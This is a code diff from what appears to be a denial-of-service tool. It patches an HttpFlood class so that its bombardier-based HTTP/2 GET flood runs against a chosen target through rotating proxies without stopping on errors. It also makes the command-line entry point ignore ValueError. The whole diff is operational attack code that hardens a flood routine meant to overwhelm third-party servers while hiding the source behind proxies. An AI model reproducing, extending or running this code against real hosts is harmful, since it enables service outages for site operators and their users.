@@ -1329,22 +1329,24 @@ class HttpFlood(Thread):
             if proxy.type != ProxyType.SOCKS4:
                 break
 
-        res = run(
-            [
-                f'{bombardier_path}',
-                f'--connections={self._rpc}',
-                '--http2',
-                '--method=GET',
-                '--latencies',
-                '--timeout=30s',
-                f'--requests={self._rpc}',
-                f'--proxy={proxy}',
-                f'{self._target.human_repr()}',
-            ],
-            stdout=PIPE,
-        )
-        if self._thread_id == 0:
-            print(proxy, res.stdout.decode(), sep='\n')
+        with suppress(Exception):
+            res = run(
+                [
+                    f'{bombardier_path}',
+                    f'--connections={self._rpc}',
+                    '--http2',
+                    '--method=GET',
+                    '--latencies',
+                    '--timeout=30s',
+                    f'--requests={self._rpc}',
+                    f'--proxy={proxy}',
+                    f'{self._target.human_repr()}',
+                ],
+                stdout=PIPE,
+                stderr=PIPE,
+            )
+            if self._thread_id == 0 and res.stdout:
+                print(proxy, res.stdout.decode(), sep='\n')
 
     def SLOW(self):
         payload: bytes = self.generate_payload()
@@ -1678,7 +1680,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
 if __name__ == '__main__':
     with suppress(KeyboardInterrupt):
-        with suppress(IndexError):
+        with suppress(IndexError, ValueError):
             one = argv[1].upper()
 
             if one == "HELP":
